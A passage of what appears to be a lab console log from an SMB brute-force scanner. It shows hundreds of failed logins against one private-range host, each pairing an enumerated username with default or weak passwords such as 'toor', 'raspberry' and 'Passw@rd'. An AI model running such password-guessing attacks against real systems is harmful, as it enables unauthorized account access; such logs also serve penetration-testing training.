[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreahar:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreaste:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andrewpow:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aubreehop:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\beckywel:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\bernardmck:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billiehil:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\billierya:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandonspe:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\brandyrod:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenhaw:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\braydenweb:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\byronwil:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\calebrod:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\chloewes:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\christinerui:raspberry',
